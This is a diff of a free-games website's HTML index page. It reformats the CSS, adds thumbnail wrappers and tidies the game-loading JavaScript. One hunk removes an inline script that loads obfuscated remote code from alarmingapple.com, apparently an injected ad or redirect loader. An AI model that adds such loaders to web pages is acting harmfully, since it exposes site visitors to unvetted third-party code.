@@ -7,12 +7,6 @@
     <title>PlayHaven – Play Free Online Games Instantly | No Downloads</title>
 
     <!-- SEO Meta -->
-     <script type="application/ld+json"> 
-      { "@context": "https://schema.org",
-       "@type": "WebSite", "name": "PlayHaven", "url": "https://playhaven.site",
-        "description": "Play free online games instantly with no downloads.",
-         "publisher": { "@type": "Organization", "name": "PlayHaven" },
-          "potentialAction": { "@type": "SearchAction", "target": "https://playhaven.site/search?q={search_term_string}", "query-input": "required name=search_term_string" } } </script>
     <meta
       name="description"
       content="PlayHaven is your ultimate destination for free online games! Play action, adventure, arcade, and casual browser games instantly with no downloads."
@@ -34,22 +28,123 @@
 
     <!-- Styles -->
     <style>
-      * {margin:0;padding:0;box-sizing:border-box;font-family:"Poppins",sans-serif;}
-      body {background: radial-gradient(circle at center,#121212,#0a0a0a);color:#fff;text-align:center;}
-      header {padding:2rem 1rem 1rem;background:#1b1b1b;box-shadow:0 0 20px rgba(0,0,0,0.5);}
-      h1 {font-size:2.5rem;font-weight:700;color:#00ffb3;}
-      p {margin-top:1rem;font-size:1.1rem;color:#ccc;}
-      #searchBar {margin:2rem auto 1rem;padding:0.8rem 1rem;width:90%;max-width:500px;border-radius:2rem;border:none;font-size:1rem;outline:none;text-align:center;background:#222;color:#fff;}
-      #searchBar::placeholder {color:#999;}
-      .game-grid {display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:1.5rem;padding:2rem;max-width:1200px;margin:auto;}
-      .game {background:#1b1b1b;border-radius:1rem;overflow:hidden;cursor:pointer;transition:transform 0.3s ease,box-shadow 0.3s ease;}
-      .game:hover {transform:translateY(-5px);box-shadow:0 0 15px #00ffb3;}
-      .game img {width:100%;height:160px;object-fit:cover;}
-      .game h3 {padding:1rem;font-size:1.1rem;color:#00ffb3;}
-      footer {background:#0a0a0a;padding:2rem;font-size:0.9rem;color:#777;}
-      footer a {color:#00ffb3;text-decoration:none;margin:0 0.5rem;}
-      footer a:hover {text-decoration:underline;}
-      @media(max-width:600px){h1{font-size:1.8rem;}}
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Poppins", sans-serif;
+      }
+
+      body {
+        background: radial-gradient(circle at center, #121212, #0a0a0a);
+        color: #fff;
+        text-align: center;
+      }
+
+      header {
+        padding: 2rem 1rem 1rem;
+        background: #1b1b1b;
+        box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+      }
+
+      h1 {
+        font-size: 2.5rem;
+        font-weight: 700;
+        color: #00ffb3;
+      }
+
+      p {
+        margin-top: 1rem;
+        font-size: 1.1rem;
+        color: #ccc;
+      }
+
+      #searchBar {
+        margin: 2rem auto 1rem;
+        padding: 0.8rem 1rem;
+        width: 90%;
+        max-width: 500px;
+        border-radius: 2rem;
+        border: none;
+        font-size: 1rem;
+        outline: none;
+        text-align: center;
+        background: #222;
+        color: #fff;
+      }
+
+      #searchBar::placeholder {
+        color: #999;
+      }
+
+      .game-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
+        gap: 1.5rem;
+        padding: 2rem;
+        max-width: 1200px;
+        margin: auto;
+      }
+
+      .game {
+        background: #1b1b1b;
+        border-radius: 1rem;
+        overflow: hidden;
+        cursor: pointer;
+        transition: transform 0.3s ease, box-shadow 0.3s ease;
+      }
+
+      .game:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 0 15px #00ffb3;
+      }
+
+      /* Maintain a consistent 16:9 ratio */
+      .thumb-wrapper {
+        position: relative;
+        width: 100%;
+        aspect-ratio: 16 / 9;
+        overflow: hidden;
+        background: #000;
+      }
+
+      .thumb-wrapper img {
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        top: 0;
+        left: 0;
+      }
+
+      .game h3 {
+        padding: 1rem;
+        font-size: 1.1rem;
+        color: #00ffb3;
+      }
+
+      footer {
+        background: #0a0a0a;
+        padding: 2rem;
+        font-size: 0.9rem;
+        color: #777;
+      }
+
+      footer a {
+        color: #00ffb3;
+        text-decoration: none;
+        margin: 0 0.5rem;
+      }
+
+      footer a:hover {
+        text-decoration: underline;
+      }
+
+      @media (max-width: 600px) {
+        h1 {
+          font-size: 1.8rem;
+        }
+      }
     </style>
   </head>
 
@@ -62,21 +157,10 @@
 
     <main>
       <section class="game-grid" id="gameGrid">
-        <!-- Games will be loaded here dynamically from JSON -->
+        <!-- Games will be loaded dynamically -->
       </section>
     </main>
-    <script>
-(function(dxuvuq){
-var d = document,
-    s = d.createElement('script'),
-    l = d.scripts[d.scripts.length - 1];
-s.settings = dxuvuq || {};
-s.src = "\/\/alarmingapple.com\/bEXnVNs\/d.G\/lW0lYxWJcc\/ceWm\/9Su\/ZUU\/lYk\/PVT\/Y\/2fNxzncm0\/MHzqEAt-NbjJY_3TNzz\/QzzEMfgL";
-s.async = true;
-s.referrerPolicy = 'no-referrer-when-downgrade';
-l.parentNode.insertBefore(s, l);
-})({})
-</script>
+
     <footer>
       <p>© 2025 PlayHaven. All Rights Reserved.</p>
       <p>
@@ -86,33 +170,35 @@ l.parentNode.insertBefore(s, l);
       </p>
     </footer>
 
-    <!-- Load games from JSON -->
+    <!-- Load games dynamically from JSON -->
     <script>
       const gameGrid = document.getElementById("gameGrid");
       const searchBar = document.getElementById("searchBar");
       let allGames = [];
 
-      // Fetch games from JSON
+      // Load games from /Games/games.json
       fetch("/Games/games.json")
-        .then(res => res.json())
-        .then(games => {
-          allGames = games; // store all games for search
+        .then((res) => res.json())
+        .then((games) => {
+          allGames = games;
           renderGames(games);
         })
-        .catch(err => {
+        .catch((err) => {
           console.error("Failed to load games:", err);
           gameGrid.innerHTML = "<p>Failed to load games!</p>";
         });
 
       function renderGames(games) {
         gameGrid.innerHTML = "";
-        games.forEach(game => {
+        games.forEach((game) => {
           const div = document.createElement("div");
           div.className = "game";
           div.dataset.name = game.name.toLowerCase();
-          div.onclick = () => window.location.href = `/Games/${game.name}/`;
+          div.onclick = () => (window.location.href = `/Games/${game.name}/`);
           div.innerHTML = `
-            <img src="${game.thumbnail}" alt="${game.title}" onerror="this.src='images/full-logo.png'">
+            <div class="thumb-wrapper">
+              <img src="${game.thumbnail}" alt="${game.title}" onerror="this.src='images/square-logo-transparent.png'">
+            </div>
             <h3>${game.title}</h3>
           `;
           gameGrid.appendChild(div);
@@ -122,8 +208,10 @@ l.parentNode.insertBefore(s, l);
       // Search functionality
       searchBar.addEventListener("input", () => {
         const query = searchBar.value.toLowerCase();
-        const filtered = allGames.filter(game =>
-          game.name.toLowerCase().includes(query) || game.title.toLowerCase().includes(query)
+        const filtered = allGames.filter(
+          (game) =>
+            game.name.toLowerCase().includes(query) ||
+            game.title.toLowerCase().includes(query)
         );
         renderGames(filtered);
       });
